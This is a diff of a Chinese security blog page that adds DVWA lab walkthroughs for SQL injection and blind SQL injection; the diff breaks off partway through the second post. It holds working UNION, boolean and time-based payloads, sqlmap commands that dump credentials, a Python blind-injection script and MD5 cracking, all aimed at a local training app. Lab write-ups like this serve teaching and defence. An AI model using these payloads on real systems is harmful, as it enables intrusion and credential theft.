@@ -120,7 +120,7 @@
 
 
 <nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">357</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">136</span></a></li>
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">359</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">138</span></a></li>
       <li class="menu-item menu-item-search">
         <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
         </a>
@@ -185,18 +185,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">136</span>
+          <span class="site-state-item-count">138</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">357</span>
+        <span class="site-state-item-count">359</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -221,6 +221,437 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/14/DVWA-SQL-Injection-Blind-SQL%E7%9B%B2%E6%B3%A8%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="l1n6yun">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l1n6yun's Blog">
+      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | l1n6yun's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/02/14/DVWA-SQL-Injection-Blind-SQL%E7%9B%B2%E6%B3%A8%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">DVWA SQL Injection Blind SQL盲注通关教程</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-02-14 10:00:00" itemprop="dateCreated datePublished" datetime="2021-02-14T10:00:00+08:00">2021-02-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>盲注，顾名思义就是”盲着注”。和普通注入不同，盲注拿不到数据库的回显，只能靠猜——通过页面不同的反应来判断猜得对不对。虽然麻烦，但能拿到数据就是好注入。</p>
+<p>这关主要学布尔盲注和时间盲注。</p>
+<h2 id="盲注类型"><a href="#盲注类型" class="headerlink" title="盲注类型"></a>盲注类型</h2><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>布尔盲注</td>
+<td>看页面返回判断条件真假</td>
+</tr>
+<tr>
+<td>时间盲注</td>
+<td>看响应时间判断条件真假</td>
+</tr>
+<tr>
+<td>报错盲注</td>
+<td>从报错信息里提取数据</td>
+</tr>
+</tbody></table>
+<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><p>先记几个盲注常用的函数：</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>length(str)</code></td>
+<td>字符串长度</td>
+</tr>
+<tr>
+<td><code>substr(str,start,length)</code></td>
+<td>截取字符串</td>
+</tr>
+<tr>
+<td><code>ascii(str)</code></td>
+<td>字符转 ASCII 码</td>
+</tr>
+<tr>
+<td><code>if(condition,a,b)</code></td>
+<td>条件判断</td>
+</tr>
+<tr>
+<td><code>sleep(n)</code></td>
+<td>延迟 n 秒</td>
+</tr>
+</tbody></table>
+<h2 id="Low-级别"><a href="#Low-级别" class="headerlink" title="Low 级别"></a>Low 级别</h2><p>看代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">    <span class="comment">// 用户存在</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 用户不存在</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有注入点，但只告诉你”存在”或”不存在”，典型的布尔盲注场景。</p>
+<h3 id="手动盲注"><a href="#手动盲注" class="headerlink" title="手动盲注"></a>手动盲注</h3><p><strong>第一步：确认注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=1#    -&gt; 用户存在</span><br><span class="line">1&#x27; and 1=2#    -&gt; 用户不存在</span><br></pre></td></tr></table></figure>
+
+<p>确认有盲注。</p>
+<p><strong>第二步：猜数据库名长度</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(database())=1#   不存在</span><br><span class="line">1&#x27; and length(database())=2#   不存在</span><br><span class="line">...</span><br><span class="line">1&#x27; and length(database())=4#   存在</span><br></pre></td></tr></table></figure>
+
+<p>数据库名 4 个字符。</p>
+<p><strong>第三步：逐字符猜</strong></p>
+<p>用二分法猜第一个字符的 ASCII 码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),1,1))&gt;97#    存在</span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))&gt;100#   存在</span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))&gt;120#   不存在</span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))=100#   存在</span><br></pre></td></tr></table></figure>
+
+<p>ASCII 码 100，就是字母 <code>d</code>。</p>
+<p>继续猜后面几个：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),2,1))=118#   -&gt; v</span><br><span class="line">1&#x27; and ascii(substr(database(),3,1))=119#   -&gt; w</span><br><span class="line">1&#x27; and ascii(substr(database(),4,1))=97#    -&gt; a</span><br></pre></td></tr></table></figure>
+
+<p>数据库名是 <code>dvwa</code>。</p>
+<p>手动盲注是真累，猜一个名字就要发几十个请求。实际渗透还是用工具吧。</p>
+<h3 id="用-SQLMap"><a href="#用-SQLMap" class="headerlink" title="用 SQLMap"></a>用 SQLMap</h3><p>SQLMap 一条命令搞定：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://localhost:3892/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=m0rsgl5arvatrm36nuq4ngdim6;security=low&quot;</span> --dbs</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/pasted-110.png" alt="upload successful"></p>
+<p>查表：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://localhost:3892/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=m0rsgl5arvatrm36nuq4ngdim6;security=low&quot;</span> -D dvwa --tables</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/pasted-111.png" alt="upload successful"></p>
+<p>查字段：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://localhost:3892/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=m0rsgl5arvatrm36nuq4ngdim6;security=low&quot;</span> -D dvwa -T <span class="built_in">users</span> --columns</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/pasted-112.png" alt="upload successful"></p>
+<p>拖数据：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://localhost:3892/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=m0rsgl5arvatrm36nuq4ngdim6;security=low&quot;</span> -D dvwa -T <span class="built_in">users</span> -C user,password --dump</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/pasted-113.png" alt="upload successful"></p>
+<p>这就是工具的力量。</p>
+<h2 id="Medium-级别"><a href="#Medium-级别" class="headerlink" title="Medium 级别"></a>Medium 级别</h2><p>Medium 级别用了 POST 提交加转义：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>注意 <code>$id</code> 没引号，是数字型注入，单引号转义没用。</p>
+<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>用 Burp 抓包改请求，或者直接用 SQLMap：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://localhost:3892/vulnerabilities/sqli_blind/&quot;</span> --data=<span class="string">&quot;id=1&amp;Submit=Submit&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=m0rsgl5arvatrm36nuq4ngdim6;security=medium&quot;</span> --dbs</span><br></pre></td></tr></table></figure>
+
+<h2 id="High-级别"><a href="#High-级别" class="headerlink" title="High 级别"></a>High 级别</h2><p>High 级别从 session 取参数，还加了 <code>LIMIT 1</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_SESSION</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>布尔盲注可能被 <code>LIMIT 1</code> 干扰，换时间盲注。</p>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p><strong>测试：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and sleep(5)#</span><br></pre></td></tr></table></figure>
+
+<p>如果响应卡了 5 秒，就说明有注入。</p>
+<p><strong>猜数据库名长度：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(length(database())=4,sleep(3),0)#</span><br></pre></td></tr></table></figure>
+
+<p>延迟 3 秒，长度是 4。</p>
+<p><strong>逐字符猜：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(ascii(substr(database(),1,1))=100,sleep(3),0)#</span><br></pre></td></tr></table></figure>
+
+<p>延迟 3 秒，第一个字符是 <code>d</code>。</p>
+<p><strong>用 SQLMap：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://localhost:3892/vulnerabilities/sqli_blind/&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=m0rsgl5arvatrm36nuq4ngdim6;security=high&quot;</span> --level=3 --risk=2 --dbs</span><br></pre></td></tr></table></figure>
+
+<h2 id="Impossible-级别"><a href="#Impossible-级别" class="headerlink" title="Impossible 级别"></a>Impossible 级别</h2><p>Impossible 级别用 PDO 预处理：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$id</span> ) ) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::<span class="variable constant_">PARAM_INT</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>预处理 + 类型验证，注入不了。</p>
+<h2 id="自动化盲注脚本"><a href="#自动化盲注脚本" class="headerlink" title="自动化盲注脚本"></a>自动化盲注脚本</h2><p>写个 Python 脚本省得手工猜：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:3892/vulnerabilities/sqli_blind/&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;m0rsgl5arvatrm36nuq4ngdim6&quot;</span>, <span class="string">&quot;security&quot;</span>: <span class="string">&quot;low&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        payload = <span class="string">f&quot;1&#x27; and ascii(substr(database(),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>#&quot;</span></span><br><span class="line">        params = &#123;<span class="string">&quot;id&quot;</span>: payload, <span class="string">&quot;Submit&quot;</span>: <span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line">        r = requests.get(url, params=params, cookies=cookies)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;User ID exists&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    <span class="keyword">if</span> low == <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result += <span class="built_in">chr</span>(low)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Database name: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Final result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>盲注虽然慢，但只要有注入点就能拿数据。防护要点和普通 SQL 注入一样：</p>
+<ol>
+<li>用预处理语句</li>
+<li>输入要验证</li>
+<li>错误信息统一处理，别让人看出来区别</li>
+<li>能用工具就别手工</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/13/DVWA-SQL-Injection-SQL%E6%B3%A8%E5%85%A5%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="l1n6yun">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l1n6yun's Blog">
+      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | l1n6yun's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/02/13/DVWA-SQL-Injection-SQL%E6%B3%A8%E5%85%A5%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">DVWA SQL Injection SQL注入通关教程</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-02-13 10:00:00" itemprop="dateCreated datePublished" datetime="2021-02-13T10:00:00+08:00">2021-02-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>SQL 注入，老牌漏洞之王了。简单说就是把恶意 SQL 语句塞到用户输入里，让数据库帮你执行。能读数据、改数据、删数据，运气好还能拿 shell。</p>
+<p>这关主要学怎么通过 SQL 注入把数据库里的敏感信息拖出来。</p>
+<h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>联合注入</td>
+<td>用 UNION 合并查询结果</td>
+</tr>
+<tr>
+<td>报错注入</td>
+<td>从报错信息里拿数据</td>
+</tr>
+<tr>
+<td>盲注</td>
+<td>没回显，靠条件判断</td>
+</tr>
+<tr>
+<td>时间盲注</td>
+<td>靠响应时间判断</td>
+</tr>
+</tbody></table>
+<h2 id="Low-级别"><a href="#Low-级别" class="headerlink" title="Low 级别"></a>Low 级别</h2><p>看代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>用户输入直接拼进 SQL 语句，经典的注入点。</p>
+<h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><p><strong>第一步：测注入点</strong></p>
+<p>输入个单引号 <code>1&#39;</code>，看反应：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>报错了，确认有注入点。</p>
+<p><strong>第二步：数字段</strong></p>
+<p>用 <code>order by</code> 测试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 1#   正常</span><br><span class="line">1&#x27; order by 2#   正常</span><br><span class="line">1&#x27; order by 3#   报错</span><br></pre></td></tr></table></figure>
+
+<p>说明查了 2 个字段。</p>
+<p><strong>第三步：找回显位置</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2#</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/pasted-103.png" alt="upload successful"></p>
+<p>两个位置都能回显。</p>
+<p><strong>第四步：查数据库</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,database()#</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/pasted-104.png" alt="upload successful"></p>
+<p>数据库名是 <code>dvwa</code>。</p>
+<p><strong>第五步：查表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/pasted-105.png" alt="upload successful"></p>
+<p>有两个表：<code>guestbook</code> 和 <code>users</code>。</p>
+<p><strong>第六步：查字段</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;#</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/pasted-107.png" alt="upload successful"></p>
+<p>字段挺多，关键是 <code>user</code> 和 <code>password</code>。</p>
+<p><strong>第七步：拖库</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select user,password from users#</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/pasted-108.png" alt="upload successful"></p>
+<p>拿到用户名和密码了，密码是 MD5 加密的。</p>
+<p><strong>第八步：破密码</strong></p>
+<p>找个 MD5 解密网站：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5f4dcc3b5aa765d61d8327deb882cf99 -&gt; password</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/pasted-109.png" alt="upload successful"></p>
+<p>搞定。</p>
+<h2 id="Medium-级别"><a href="#Medium-级别" class="headerlink" title="Medium 级别"></a>Medium 级别</h2><p>Medium 用了 <code>mysql_real_escape_string()</code> 转义：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>单引号双引号都被转义了，但注意看 SQL 语句，<code>$id</code> 没有用引号包起来，是数字型注入。</p>
+<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>因为是 POST 提交，得用 Burp 抓包改。</p>
+<p><strong>判断字段：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 order by 2#</span><br></pre></td></tr></table></figure>
+
+<p><strong>联合注入：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,database()#</span><br></pre></td></tr></table></figure>
+
+<p><strong>绕过单引号过滤：</strong></p>
+<p>查字段名的时候要用 <code>table_name=&#39;users&#39;</code>，但单引号被转义了。用十六进制绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273#</span><br></pre></td></tr></table></figure>
+
+<p><code>0x7573657273</code> 就是 <code>users</code> 的十六进制。</p>
+<h2 id="High-级别"><a href="#High-级别" class="headerlink" title="High 级别"></a>High 级别</h2><p>High 级别从 session 取参数，还在另一个页面显示结果：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_SESSION</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>加了个 <code>LIMIT 1</code>，以为能限制结果数量？注释掉不就行了。</p>
+<h3 id="攻击方法-1"><a href="#攻击方法-1" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>直接注入，用 <code>#</code> 注释掉后面的 <code>LIMIT 1</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select user,password from users#</span><br></pre></td></tr></table></figure>
+
+<p>照样拖库。</p>
+<h2 id="Impossible-级别"><a href="#Impossible-级别" class="headerlink" title="Impossible 级别"></a>Impossible 级别</h2><p>Impossible 级别用了 PDO 预处理：</p>
